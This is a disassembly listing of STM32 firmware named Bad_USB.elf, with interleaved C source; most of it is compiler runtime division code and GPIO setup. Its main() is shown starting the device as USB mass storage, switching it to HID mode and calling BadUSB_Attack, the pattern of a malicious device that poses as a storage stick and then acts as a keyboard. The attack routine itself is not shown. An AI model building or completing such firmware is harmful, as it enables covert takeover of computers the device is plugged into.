
Bad_USB.elf:     file format elf32-littlearm

Sections:
Idx Name          Size      VMA       LMA       File off  Algn
  0 .isr_vector   0000018c  08000000  08000000  00010000  2**0
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  1 .text         0000cf34  0800018c  0800018c  0001018c  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, CODE
  2 .rodata       00000228  0800d0c0  0800d0c0  0001d0c0  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  3 .ARM.extab    00000000  0800d2e8  0800d2e8  00020240  2**0
                  CONTENTS
  4 .ARM          00000008  0800d2e8  0800d2e8  0001d2e8  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  5 .preinit_array 00000000  0800d2f0  0800d2f0  00020240  2**0
                  CONTENTS, ALLOC, LOAD, DATA
  6 .init_array   00000004  0800d2f0  0800d2f0  0001d2f0  2**2
                  CONTENTS, ALLOC, LOAD, DATA
  7 .fini_array   00000004  0800d2f4  0800d2f4  0001d2f4  2**2
                  CONTENTS, ALLOC, LOAD, DATA
  8 .data         00000240  20000000  0800d2f8  00020000  2**2
                  CONTENTS, ALLOC, LOAD, DATA
  9 .bss          00001cd4  20000240  0800d538  00020240  2**2
                  ALLOC
 10 ._user_heap_stack 00001604  20001f14  0800d538  00021f14  2**0
                  ALLOC
 11 .ARM.attributes 00000030  00000000  00000000  00020240  2**0
                  CONTENTS, READONLY
 12 .comment      00000043  00000000  00000000  00020270  2**0
                  CONTENTS, READONLY
 13 .debug_info   00020aaf  00000000  00000000  000202b3  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 14 .debug_abbrev 0000538c  00000000  00000000  00040d62  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 15 .debug_aranges 00001b38  00000000  00000000  000460f0  2**3
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 16 .debug_rnglists 000014c7  00000000  00000000  00047c28  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 17 .debug_macro  00026624  00000000  00000000  000490ef  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 18 .debug_line   00025b43  00000000  00000000  0006f713  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 19 .debug_str    000d24ba  00000000  00000000  00095256  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 20 .debug_frame  00006f6c  00000000  00000000  00167710  2**2
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 21 .debug_line_str 00000049  00000000  00000000  0016e67c  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS

Disassembly of section .text:

0800018c <__do_global_dtors_aux>:
 800018c:	b510      	push	{r4, lr}
 800018e:	4c05      	ldr	r4, [pc, #20]	; (80001a4 <__do_global_dtors_aux+0x18>)
 8000190:	7823      	ldrb	r3, [r4, #0]
 8000192:	b933      	cbnz	r3, 80001a2 <__do_global_dtors_aux+0x16>
 8000194:	4b04      	ldr	r3, [pc, #16]	; (80001a8 <__do_global_dtors_aux+0x1c>)
 8000196:	b113      	cbz	r3, 800019e <__do_global_dtors_aux+0x12>
 8000198:	4804      	ldr	r0, [pc, #16]	; (80001ac <__do_global_dtors_aux+0x20>)
 800019a:	f3af 8000 	nop.w
 800019e:	2301      	movs	r3, #1
 80001a0:	7023      	strb	r3, [r4, #0]
 80001a2:	bd10      	pop	{r4, pc}
 80001a4:	20000240 	.word	0x20000240
 80001a8:	00000000 	.word	0x00000000
 80001ac:	0800d0a8 	.word	0x0800d0a8

080001b0 <frame_dummy>:
 80001b0:	b508      	push	{r3, lr}
 80001b2:	4b03      	ldr	r3, [pc, #12]	; (80001c0 <frame_dummy+0x10>)
 80001b4:	b11b      	cbz	r3, 80001be <frame_dummy+0xe>
 80001b6:	4903      	ldr	r1, [pc, #12]	; (80001c4 <frame_dummy+0x14>)
 80001b8:	4803      	ldr	r0, [pc, #12]	; (80001c8 <frame_dummy+0x18>)
 80001ba:	f3af 8000 	nop.w
 80001be:	bd08      	pop	{r3, pc}
 80001c0:	00000000 	.word	0x00000000
 80001c4:	20000244 	.word	0x20000244
 80001c8:	0800d0a8 	.word	0x0800d0a8

080001cc <strlen>:
 80001cc:	4603      	mov	r3, r0
 80001ce:	f813 2b01 	ldrb.w	r2, [r3], #1
 80001d2:	2a00      	cmp	r2, #0
 80001d4:	d1fb      	bne.n	80001ce <strlen+0x2>
 80001d6:	1a18      	subs	r0, r3, r0
 80001d8:	3801      	subs	r0, #1
 80001da:	4770      	bx	lr

080001dc <__aeabi_uldivmod>:
 80001dc:	b953      	cbnz	r3, 80001f4 <__aeabi_uldivmod+0x18>
 80001de:	b94a      	cbnz	r2, 80001f4 <__aeabi_uldivmod+0x18>
 80001e0:	2900      	cmp	r1, #0
 80001e2:	bf08      	it	eq
 80001e4:	2800      	cmpeq	r0, #0
 80001e6:	bf1c      	itt	ne
 80001e8:	f04f 31ff 	movne.w	r1, #4294967295
 80001ec:	f04f 30ff 	movne.w	r0, #4294967295
 80001f0:	f000 b970 	b.w	80004d4 <__aeabi_idiv0>
 80001f4:	f1ad 0c08 	sub.w	ip, sp, #8
 80001f8:	e96d ce04 	strd	ip, lr, [sp, #-16]!
 80001fc:	f000 f806 	bl	800020c <__udivmoddi4>
 8000200:	f8dd e004 	ldr.w	lr, [sp, #4]
 8000204:	e9dd 2302 	ldrd	r2, r3, [sp, #8]
 8000208:	b004      	add	sp, #16
 800020a:	4770      	bx	lr

0800020c <__udivmoddi4>:
 800020c:	e92d 47f0 	stmdb	sp!, {r4, r5, r6, r7, r8, r9, sl, lr}
 8000210:	9e08      	ldr	r6, [sp, #32]
 8000212:	460d      	mov	r5, r1
 8000214:	4604      	mov	r4, r0
 8000216:	460f      	mov	r7, r1
 8000218:	2b00      	cmp	r3, #0
 800021a:	d14a      	bne.n	80002b2 <__udivmoddi4+0xa6>
 800021c:	428a      	cmp	r2, r1
 800021e:	4694      	mov	ip, r2
 8000220:	d965      	bls.n	80002ee <__udivmoddi4+0xe2>
 8000222:	fab2 f382 	clz	r3, r2
 8000226:	b143      	cbz	r3, 800023a <__udivmoddi4+0x2e>
 8000228:	fa02 fc03 	lsl.w	ip, r2, r3
 800022c:	f1c3 0220 	rsb	r2, r3, #32
 8000230:	409f      	lsls	r7, r3
 8000232:	fa20 f202 	lsr.w	r2, r0, r2
 8000236:	4317      	orrs	r7, r2
 8000238:	409c      	lsls	r4, r3
 800023a:	ea4f 4e1c 	mov.w	lr, ip, lsr #16
 800023e:	fa1f f58c 	uxth.w	r5, ip
 8000242:	fbb7 f1fe 	udiv	r1, r7, lr
 8000246:	0c22      	lsrs	r2, r4, #16
 8000248:	fb0e 7711 	mls	r7, lr, r1, r7
 800024c:	ea42 4207 	orr.w	r2, r2, r7, lsl #16
 8000250:	fb01 f005 	mul.w	r0, r1, r5
 8000254:	4290      	cmp	r0, r2
 8000256:	d90a      	bls.n	800026e <__udivmoddi4+0x62>
 8000258:	eb1c 0202 	adds.w	r2, ip, r2
 800025c:	f101 37ff 	add.w	r7, r1, #4294967295
 8000260:	f080 811c 	bcs.w	800049c <__udivmoddi4+0x290>
 8000264:	4290      	cmp	r0, r2
 8000266:	f240 8119 	bls.w	800049c <__udivmoddi4+0x290>
 800026a:	3902      	subs	r1, #2
 800026c:	4462      	add	r2, ip
 800026e:	1a12      	subs	r2, r2, r0
 8000270:	b2a4      	uxth	r4, r4
 8000272:	fbb2 f0fe 	udiv	r0, r2, lr
 8000276:	fb0e 2210 	mls	r2, lr, r0, r2
 800027a:	ea44 4402 	orr.w	r4, r4, r2, lsl #16
 800027e:	fb00 f505 	mul.w	r5, r0, r5
 8000282:	42a5      	cmp	r5, r4
 8000284:	d90a      	bls.n	800029c <__udivmoddi4+0x90>
 8000286:	eb1c 0404 	adds.w	r4, ip, r4
 800028a:	f100 32ff 	add.w	r2, r0, #4294967295
 800028e:	f080 8107 	bcs.w	80004a0 <__udivmoddi4+0x294>
 8000292:	42a5      	cmp	r5, r4
 8000294:	f240 8104 	bls.w	80004a0 <__udivmoddi4+0x294>
 8000298:	4464      	add	r4, ip
 800029a:	3802      	subs	r0, #2
 800029c:	ea40 4001 	orr.w	r0, r0, r1, lsl #16
 80002a0:	1b64      	subs	r4, r4, r5
 80002a2:	2100      	movs	r1, #0
 80002a4:	b11e      	cbz	r6, 80002ae <__udivmoddi4+0xa2>
 80002a6:	40dc      	lsrs	r4, r3
 80002a8:	2300      	movs	r3, #0
 80002aa:	e9c6 4300 	strd	r4, r3, [r6]
 80002ae:	e8bd 87f0 	ldmia.w	sp!, {r4, r5, r6, r7, r8, r9, sl, pc}
 80002b2:	428b      	cmp	r3, r1
 80002b4:	d908      	bls.n	80002c8 <__udivmoddi4+0xbc>
 80002b6:	2e00      	cmp	r6, #0
 80002b8:	f000 80ed 	beq.w	8000496 <__udivmoddi4+0x28a>
 80002bc:	2100      	movs	r1, #0
 80002be:	e9c6 0500 	strd	r0, r5, [r6]
 80002c2:	4608      	mov	r0, r1
 80002c4:	e8bd 87f0 	ldmia.w	sp!, {r4, r5, r6, r7, r8, r9, sl, pc}
 80002c8:	fab3 f183 	clz	r1, r3
 80002cc:	2900      	cmp	r1, #0
 80002ce:	d149      	bne.n	8000364 <__udivmoddi4+0x158>
 80002d0:	42ab      	cmp	r3, r5
 80002d2:	d302      	bcc.n	80002da <__udivmoddi4+0xce>
 80002d4:	4282      	cmp	r2, r0
 80002d6:	f200 80f8 	bhi.w	80004ca <__udivmoddi4+0x2be>
 80002da:	1a84      	subs	r4, r0, r2
 80002dc:	eb65 0203 	sbc.w	r2, r5, r3
 80002e0:	2001      	movs	r0, #1
 80002e2:	4617      	mov	r7, r2
 80002e4:	2e00      	cmp	r6, #0
 80002e6:	d0e2      	beq.n	80002ae <__udivmoddi4+0xa2>
 80002e8:	e9c6 4700 	strd	r4, r7, [r6]
 80002ec:	e7df      	b.n	80002ae <__udivmoddi4+0xa2>
 80002ee:	b902      	cbnz	r2, 80002f2 <__udivmoddi4+0xe6>
 80002f0:	deff      	udf	#255	; 0xff
 80002f2:	fab2 f382 	clz	r3, r2
 80002f6:	2b00      	cmp	r3, #0
 80002f8:	f040 8090 	bne.w	800041c <__udivmoddi4+0x210>
 80002fc:	1a8a      	subs	r2, r1, r2
 80002fe:	ea4f 471c 	mov.w	r7, ip, lsr #16
 8000302:	fa1f fe8c 	uxth.w	lr, ip
 8000306:	2101      	movs	r1, #1
 8000308:	fbb2 f5f7 	udiv	r5, r2, r7
 800030c:	fb07 2015 	mls	r0, r7, r5, r2
 8000310:	0c22      	lsrs	r2, r4, #16
 8000312:	ea42 4200 	orr.w	r2, r2, r0, lsl #16
 8000316:	fb0e f005 	mul.w	r0, lr, r5
 800031a:	4290      	cmp	r0, r2
 800031c:	d908      	bls.n	8000330 <__udivmoddi4+0x124>
 800031e:	eb1c 0202 	adds.w	r2, ip, r2
 8000322:	f105 38ff 	add.w	r8, r5, #4294967295
 8000326:	d202      	bcs.n	800032e <__udivmoddi4+0x122>
 8000328:	4290      	cmp	r0, r2
 800032a:	f200 80cb 	bhi.w	80004c4 <__udivmoddi4+0x2b8>
 800032e:	4645      	mov	r5, r8
 8000330:	1a12      	subs	r2, r2, r0
 8000332:	b2a4      	uxth	r4, r4
 8000334:	fbb2 f0f7 	udiv	r0, r2, r7
 8000338:	fb07 2210 	mls	r2, r7, r0, r2
 800033c:	ea44 4402 	orr.w	r4, r4, r2, lsl #16
 8000340:	fb0e fe00 	mul.w	lr, lr, r0
 8000344:	45a6      	cmp	lr, r4
 8000346:	d908      	bls.n	800035a <__udivmoddi4+0x14e>
 8000348:	eb1c 0404 	adds.w	r4, ip, r4
 800034c:	f100 32ff 	add.w	r2, r0, #4294967295
 8000350:	d202      	bcs.n	8000358 <__udivmoddi4+0x14c>
 8000352:	45a6      	cmp	lr, r4
 8000354:	f200 80bb 	bhi.w	80004ce <__udivmoddi4+0x2c2>
 8000358:	4610      	mov	r0, r2
 800035a:	eba4 040e 	sub.w	r4, r4, lr
 800035e:	ea40 4005 	orr.w	r0, r0, r5, lsl #16
 8000362:	e79f      	b.n	80002a4 <__udivmoddi4+0x98>
 8000364:	f1c1 0720 	rsb	r7, r1, #32
 8000368:	408b      	lsls	r3, r1
 800036a:	fa22 fc07 	lsr.w	ip, r2, r7
 800036e:	ea4c 0c03 	orr.w	ip, ip, r3
 8000372:	fa05 f401 	lsl.w	r4, r5, r1
 8000376:	fa20 f307 	lsr.w	r3, r0, r7
 800037a:	40fd      	lsrs	r5, r7
 800037c:	ea4f 491c 	mov.w	r9, ip, lsr #16
 8000380:	4323      	orrs	r3, r4
 8000382:	fbb5 f8f9 	udiv	r8, r5, r9
 8000386:	fa1f fe8c 	uxth.w	lr, ip
 800038a:	fb09 5518 	mls	r5, r9, r8, r5
 800038e:	0c1c      	lsrs	r4, r3, #16
 8000390:	ea44 4405 	orr.w	r4, r4, r5, lsl #16
 8000394:	fb08 f50e 	mul.w	r5, r8, lr
 8000398:	42a5      	cmp	r5, r4
 800039a:	fa02 f201 	lsl.w	r2, r2, r1
 800039e:	fa00 f001 	lsl.w	r0, r0, r1
 80003a2:	d90b      	bls.n	80003bc <__udivmoddi4+0x1b0>
 80003a4:	eb1c 0404 	adds.w	r4, ip, r4
 80003a8:	f108 3aff 	add.w	sl, r8, #4294967295
 80003ac:	f080 8088 	bcs.w	80004c0 <__udivmoddi4+0x2b4>
 80003b0:	42a5      	cmp	r5, r4
 80003b2:	f240 8085 	bls.w	80004c0 <__udivmoddi4+0x2b4>
 80003b6:	f1a8 0802 	sub.w	r8, r8, #2
 80003ba:	4464      	add	r4, ip
 80003bc:	1b64      	subs	r4, r4, r5
 80003be:	b29d      	uxth	r5, r3
 80003c0:	fbb4 f3f9 	udiv	r3, r4, r9
 80003c4:	fb09 4413 	mls	r4, r9, r3, r4
 80003c8:	ea45 4404 	orr.w	r4, r5, r4, lsl #16
 80003cc:	fb03 fe0e 	mul.w	lr, r3, lr
 80003d0:	45a6      	cmp	lr, r4
 80003d2:	d908      	bls.n	80003e6 <__udivmoddi4+0x1da>
 80003d4:	eb1c 0404 	adds.w	r4, ip, r4
 80003d8:	f103 35ff 	add.w	r5, r3, #4294967295
 80003dc:	d26c      	bcs.n	80004b8 <__udivmoddi4+0x2ac>
 80003de:	45a6      	cmp	lr, r4
 80003e0:	d96a      	bls.n	80004b8 <__udivmoddi4+0x2ac>
 80003e2:	3b02      	subs	r3, #2
 80003e4:	4464      	add	r4, ip
 80003e6:	ea43 4308 	orr.w	r3, r3, r8, lsl #16
 80003ea:	fba3 9502 	umull	r9, r5, r3, r2
 80003ee:	eba4 040e 	sub.w	r4, r4, lr
 80003f2:	42ac      	cmp	r4, r5
 80003f4:	46c8      	mov	r8, r9
 80003f6:	46ae      	mov	lr, r5
 80003f8:	d356      	bcc.n	80004a8 <__udivmoddi4+0x29c>
 80003fa:	d053      	beq.n	80004a4 <__udivmoddi4+0x298>
 80003fc:	b156      	cbz	r6, 8000414 <__udivmoddi4+0x208>
 80003fe:	ebb0 0208 	subs.w	r2, r0, r8
 8000402:	eb64 040e 	sbc.w	r4, r4, lr
 8000406:	fa04 f707 	lsl.w	r7, r4, r7
 800040a:	40ca      	lsrs	r2, r1
 800040c:	40cc      	lsrs	r4, r1
 800040e:	4317      	orrs	r7, r2
 8000410:	e9c6 7400 	strd	r7, r4, [r6]
 8000414:	4618      	mov	r0, r3
 8000416:	2100      	movs	r1, #0
 8000418:	e8bd 87f0 	ldmia.w	sp!, {r4, r5, r6, r7, r8, r9, sl, pc}
 800041c:	f1c3 0120 	rsb	r1, r3, #32
 8000420:	fa02 fc03 	lsl.w	ip, r2, r3
 8000424:	fa20 f201 	lsr.w	r2, r0, r1
 8000428:	fa25 f101 	lsr.w	r1, r5, r1
 800042c:	409d      	lsls	r5, r3
 800042e:	432a      	orrs	r2, r5
 8000430:	ea4f 471c 	mov.w	r7, ip, lsr #16
 8000434:	fa1f fe8c 	uxth.w	lr, ip
 8000438:	fbb1 f0f7 	udiv	r0, r1, r7
 800043c:	fb07 1510 	mls	r5, r7, r0, r1
 8000440:	0c11      	lsrs	r1, r2, #16
 8000442:	ea41 4105 	orr.w	r1, r1, r5, lsl #16
 8000446:	fb00 f50e 	mul.w	r5, r0, lr
 800044a:	428d      	cmp	r5, r1
 800044c:	fa04 f403 	lsl.w	r4, r4, r3
 8000450:	d908      	bls.n	8000464 <__udivmoddi4+0x258>
 8000452:	eb1c 0101 	adds.w	r1, ip, r1
 8000456:	f100 38ff 	add.w	r8, r0, #4294967295
 800045a:	d22f      	bcs.n	80004bc <__udivmoddi4+0x2b0>
 800045c:	428d      	cmp	r5, r1
 800045e:	d92d      	bls.n	80004bc <__udivmoddi4+0x2b0>
 8000460:	3802      	subs	r0, #2
 8000462:	4461      	add	r1, ip
 8000464:	1b49      	subs	r1, r1, r5
 8000466:	b292      	uxth	r2, r2
 8000468:	fbb1 f5f7 	udiv	r5, r1, r7
 800046c:	fb07 1115 	mls	r1, r7, r5, r1
 8000470:	ea42 4201 	orr.w	r2, r2, r1, lsl #16
 8000474:	fb05 f10e 	mul.w	r1, r5, lr
 8000478:	4291      	cmp	r1, r2
 800047a:	d908      	bls.n	800048e <__udivmoddi4+0x282>
 800047c:	eb1c 0202 	adds.w	r2, ip, r2
 8000480:	f105 38ff 	add.w	r8, r5, #4294967295
 8000484:	d216      	bcs.n	80004b4 <__udivmoddi4+0x2a8>
 8000486:	4291      	cmp	r1, r2
 8000488:	d914      	bls.n	80004b4 <__udivmoddi4+0x2a8>
 800048a:	3d02      	subs	r5, #2
 800048c:	4462      	add	r2, ip
 800048e:	1a52      	subs	r2, r2, r1
 8000490:	ea45 4100 	orr.w	r1, r5, r0, lsl #16
 8000494:	e738      	b.n	8000308 <__udivmoddi4+0xfc>
 8000496:	4631      	mov	r1, r6
 8000498:	4630      	mov	r0, r6
 800049a:	e708      	b.n	80002ae <__udivmoddi4+0xa2>
 800049c:	4639      	mov	r1, r7
 800049e:	e6e6      	b.n	800026e <__udivmoddi4+0x62>
 80004a0:	4610      	mov	r0, r2
 80004a2:	e6fb      	b.n	800029c <__udivmoddi4+0x90>
 80004a4:	4548      	cmp	r0, r9
 80004a6:	d2a9      	bcs.n	80003fc <__udivmoddi4+0x1f0>
 80004a8:	ebb9 0802 	subs.w	r8, r9, r2
 80004ac:	eb65 0e0c 	sbc.w	lr, r5, ip
 80004b0:	3b01      	subs	r3, #1
 80004b2:	e7a3      	b.n	80003fc <__udivmoddi4+0x1f0>
 80004b4:	4645      	mov	r5, r8
 80004b6:	e7ea      	b.n	800048e <__udivmoddi4+0x282>
 80004b8:	462b      	mov	r3, r5
 80004ba:	e794      	b.n	80003e6 <__udivmoddi4+0x1da>
 80004bc:	4640      	mov	r0, r8
 80004be:	e7d1      	b.n	8000464 <__udivmoddi4+0x258>
 80004c0:	46d0      	mov	r8, sl
 80004c2:	e77b      	b.n	80003bc <__udivmoddi4+0x1b0>
 80004c4:	3d02      	subs	r5, #2
 80004c6:	4462      	add	r2, ip
 80004c8:	e732      	b.n	8000330 <__udivmoddi4+0x124>
 80004ca:	4608      	mov	r0, r1
 80004cc:	e70a      	b.n	80002e4 <__udivmoddi4+0xd8>
 80004ce:	4464      	add	r4, ip
 80004d0:	3802      	subs	r0, #2
 80004d2:	e742      	b.n	800035a <__udivmoddi4+0x14e>

080004d4 <__aeabi_idiv0>:
 80004d4:	4770      	bx	lr
 80004d6:	bf00      	nop

080004d8 <MX_GPIO_Init>:
        * Output
        * EVENT_OUT
        * EXTI
*/
void MX_GPIO_Init(void)
{
 80004d8:	b580      	push	{r7, lr}
 80004da:	b088      	sub	sp, #32
 80004dc:	af00      	add	r7, sp, #0

  GPIO_InitTypeDef GPIO_InitStruct = {0};
 80004de:	f107 030c 	add.w	r3, r7, #12
 80004e2:	2200      	movs	r2, #0
 80004e4:	601a      	str	r2, [r3, #0]
 80004e6:	605a      	str	r2, [r3, #4]
 80004e8:	609a      	str	r2, [r3, #8]
 80004ea:	60da      	str	r2, [r3, #12]
 80004ec:	611a      	str	r2, [r3, #16]

  /* GPIO Ports Clock Enable */
  __HAL_RCC_GPIOC_CLK_ENABLE();
 80004ee:	4b24      	ldr	r3, [pc, #144]	; (8000580 <MX_GPIO_Init+0xa8>)
 80004f0:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 80004f2:	4a23      	ldr	r2, [pc, #140]	; (8000580 <MX_GPIO_Init+0xa8>)
 80004f4:	f043 0304 	orr.w	r3, r3, #4
 80004f8:	64d3      	str	r3, [r2, #76]	; 0x4c
 80004fa:	4b21      	ldr	r3, [pc, #132]	; (8000580 <MX_GPIO_Init+0xa8>)
 80004fc:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 80004fe:	f003 0304 	and.w	r3, r3, #4
 8000502:	60bb      	str	r3, [r7, #8]
 8000504:	68bb      	ldr	r3, [r7, #8]
  __HAL_RCC_GPIOA_CLK_ENABLE();
 8000506:	4b1e      	ldr	r3, [pc, #120]	; (8000580 <MX_GPIO_Init+0xa8>)
 8000508:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 800050a:	4a1d      	ldr	r2, [pc, #116]	; (8000580 <MX_GPIO_Init+0xa8>)
 800050c:	f043 0301 	orr.w	r3, r3, #1
 8000510:	64d3      	str	r3, [r2, #76]	; 0x4c
 8000512:	4b1b      	ldr	r3, [pc, #108]	; (8000580 <MX_GPIO_Init+0xa8>)
 8000514:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8000516:	f003 0301 	and.w	r3, r3, #1
 800051a:	607b      	str	r3, [r7, #4]
 800051c:	687b      	ldr	r3, [r7, #4]
  __HAL_RCC_GPIOB_CLK_ENABLE();
 800051e:	4b18      	ldr	r3, [pc, #96]	; (8000580 <MX_GPIO_Init+0xa8>)
 8000520:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8000522:	4a17      	ldr	r2, [pc, #92]	; (8000580 <MX_GPIO_Init+0xa8>)
 8000524:	f043 0302 	orr.w	r3, r3, #2
 8000528:	64d3      	str	r3, [r2, #76]	; 0x4c
 800052a:	4b15      	ldr	r3, [pc, #84]	; (8000580 <MX_GPIO_Init+0xa8>)
 800052c:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 800052e:	f003 0302 	and.w	r3, r3, #2
 8000532:	603b      	str	r3, [r7, #0]
 8000534:	683b      	ldr	r3, [r7, #0]

  /*Configure GPIO pin Output Level */
  HAL_GPIO_WritePin(GPIOB, SPI1_CS_Pin|LD3_Pin, GPIO_PIN_SET);
 8000536:	2201      	movs	r2, #1
 8000538:	2109      	movs	r1, #9
 800053a:	4812      	ldr	r0, [pc, #72]	; (8000584 <MX_GPIO_Init+0xac>)
 800053c:	f001 fb88 	bl	8001c50 <HAL_GPIO_WritePin>

  /*Configure GPIO pin : PtPin */
  GPIO_InitStruct.Pin = SPI1_CS_Pin;
 8000540:	2301      	movs	r3, #1
 8000542:	60fb      	str	r3, [r7, #12]
  GPIO_InitStruct.Mode = GPIO_MODE_OUTPUT_PP;
 8000544:	2301      	movs	r3, #1
 8000546:	613b      	str	r3, [r7, #16]
  GPIO_InitStruct.Pull = GPIO_PULLUP;
 8000548:	2301      	movs	r3, #1
 800054a:	617b      	str	r3, [r7, #20]
  GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_LOW;
 800054c:	2300      	movs	r3, #0
 800054e:	61bb      	str	r3, [r7, #24]
  HAL_GPIO_Init(SPI1_CS_GPIO_Port, &GPIO_InitStruct);
 8000550:	f107 030c 	add.w	r3, r7, #12
 8000554:	4619      	mov	r1, r3
 8000556:	480b      	ldr	r0, [pc, #44]	; (8000584 <MX_GPIO_Init+0xac>)
 8000558:	f001 fa10 	bl	800197c <HAL_GPIO_Init>

  /*Configure GPIO pin : PtPin */
  GPIO_InitStruct.Pin = LD3_Pin;
 800055c:	2308      	movs	r3, #8
 800055e:	60fb      	str	r3, [r7, #12]
  GPIO_InitStruct.Mode = GPIO_MODE_OUTPUT_PP;
 8000560:	2301      	movs	r3, #1
 8000562:	613b      	str	r3, [r7, #16]
  GPIO_InitStruct.Pull = GPIO_NOPULL;
 8000564:	2300      	movs	r3, #0
 8000566:	617b      	str	r3, [r7, #20]
  GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_LOW;
 8000568:	2300      	movs	r3, #0
 800056a:	61bb      	str	r3, [r7, #24]
  HAL_GPIO_Init(LD3_GPIO_Port, &GPIO_InitStruct);
 800056c:	f107 030c 	add.w	r3, r7, #12
 8000570:	4619      	mov	r1, r3
 8000572:	4804      	ldr	r0, [pc, #16]	; (8000584 <MX_GPIO_Init+0xac>)
 8000574:	f001 fa02 	bl	800197c <HAL_GPIO_Init>

}
 8000578:	bf00      	nop
 800057a:	3720      	adds	r7, #32
 800057c:	46bd      	mov	sp, r7
 800057e:	bd80      	pop	{r7, pc}
 8000580:	40021000 	.word	0x40021000
 8000584:	48000400 	.word	0x48000400

08000588 <main>:
/**
  * @brief  The application entry point.
  * @retval int
  */
int main(void)
{
 8000588:	b580      	push	{r7, lr}
 800058a:	b082      	sub	sp, #8
 800058c:	af00      	add	r7, sp, #0
  /* USER CODE END 1 */

  /* MCU Configuration--------------------------------------------------------*/

  /* Reset of all peripherals, Initializes the Flash interface and the Systick. */
  HAL_Init();
 800058e:	f000 fdd2 	bl	8001136 <HAL_Init>
  /* USER CODE BEGIN Init */

  /* USER CODE END Init */

  /* Configure the system clock */
  SystemClock_Config();
 8000592:	f000 f85f 	bl	8000654 <SystemClock_Config>
  /* USER CODE BEGIN SysInit */

  /* USER CODE END SysInit */

  /* Initialize all configured peripherals */
  MX_GPIO_Init();
 8000596:	f7ff ff9f 	bl	80004d8 <MX_GPIO_Init>
  MX_USART2_UART_Init();
 800059a:	f000 fd09 	bl	8000fb0 <MX_USART2_UART_Init>
  MX_SPI1_Init();
 800059e:	f000 fba1 	bl	8000ce4 <MX_SPI1_Init>
  /* USER CODE BEGIN 2 */
  int flag = 0;
 80005a2:	2300      	movs	r3, #0
 80005a4:	607b      	str	r3, [r7, #4]
  isMSC = 1;
 80005a6:	4b27      	ldr	r3, [pc, #156]	; (8000644 <main+0xbc>)
 80005a8:	2201      	movs	r2, #1
 80005aa:	601a      	str	r2, [r3, #0]
  uint32_t Flash_Busy;
  MX_USB_DEVICE_Init_MSC();
 80005ac:	f00b ff3a 	bl	800c424 <MX_USB_DEVICE_Init_MSC>

  memset(sent_buffer, 0x00, sizeof(uint8_t)*USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 80005b0:	220f      	movs	r2, #15
 80005b2:	2100      	movs	r1, #0
 80005b4:	4824      	ldr	r0, [pc, #144]	; (8000648 <main+0xc0>)
 80005b6:	f00c fd3d 	bl	800d034 <memset>

  flag = 1;
 80005ba:	2301      	movs	r3, #1
 80005bc:	607b      	str	r3, [r7, #4]
  /* USER CODE END 2 */

  /* Infinite loop */
  /* USER CODE BEGIN WHILE */
  while(1){
	  InterruptTrap(&InterruptFlag);
 80005be:	4823      	ldr	r0, [pc, #140]	; (800064c <main+0xc4>)
 80005c0:	f000 fa70 	bl	8000aa4 <InterruptTrap>
	  Flash_Busy = __HAL_FLASH_GET_FLAG(FLASH_FLAG_BSY);
 80005c4:	4b22      	ldr	r3, [pc, #136]	; (8000650 <main+0xc8>)
 80005c6:	691b      	ldr	r3, [r3, #16]
 80005c8:	f403 3380 	and.w	r3, r3, #65536	; 0x10000
 80005cc:	2b00      	cmp	r3, #0
 80005ce:	bf14      	ite	ne
 80005d0:	2301      	movne	r3, #1
 80005d2:	2300      	moveq	r3, #0
 80005d4:	b2db      	uxtb	r3, r3
 80005d6:	603b      	str	r3, [r7, #0]
	  switch(flag){
 80005d8:	687b      	ldr	r3, [r7, #4]
 80005da:	2b01      	cmp	r3, #1
 80005dc:	d003      	beq.n	80005e6 <main+0x5e>
 80005de:	687b      	ldr	r3, [r7, #4]
 80005e0:	2b02      	cmp	r3, #2
 80005e2:	d01c      	beq.n	800061e <main+0x96>
		  }
		  flag = 0;
		  SwitchToMSC();
		  break;
	  default:
		  break;
 80005e4:	e02c      	b.n	8000640 <main+0xb8>
		  HAL_Delay(10000);
 80005e6:	f242 7010 	movw	r0, #10000	; 0x2710
 80005ea:	f000 fe19 	bl	8001220 <HAL_Delay>
			  if(!Flash_Busy){
 80005ee:	683b      	ldr	r3, [r7, #0]
 80005f0:	2b00      	cmp	r3, #0
 80005f2:	d1fc      	bne.n	80005ee <main+0x66>
				  SwitchToHID();
 80005f4:	f000 f8a6 	bl	8000744 <SwitchToHID>
				  while(!TestHID())
 80005f8:	e003      	b.n	8000602 <main+0x7a>
					  HAL_Delay(TestHIDSlot);
 80005fa:	f44f 707a 	mov.w	r0, #1000	; 0x3e8
 80005fe:	f000 fe0f 	bl	8001220 <HAL_Delay>
				  while(!TestHID())
 8000602:	f000 fa6d 	bl	8000ae0 <TestHID>
 8000606:	4603      	mov	r3, r0
 8000608:	2b00      	cmp	r3, #0
 800060a:	d0f6      	beq.n	80005fa <main+0x72>
				  BadUSB_Attack(0);
 800060c:	2000      	movs	r0, #0
 800060e:	f000 fa8f 	bl	8000b30 <BadUSB_Attack>
				  break;
 8000612:	bf00      	nop
		  flag = 2;
 8000614:	2302      	movs	r3, #2
 8000616:	607b      	str	r3, [r7, #4]
		  SwitchToMSC();
 8000618:	f000 f8ac 	bl	8000774 <SwitchToMSC>
		  break;
 800061c:	e010      	b.n	8000640 <main+0xb8>
		  HAL_Delay(20000);
 800061e:	f644 6020 	movw	r0, #20000	; 0x4e20
 8000622:	f000 fdfd 	bl	8001220 <HAL_Delay>
			  if(!Flash_Busy){
 8000626:	683b      	ldr	r3, [r7, #0]
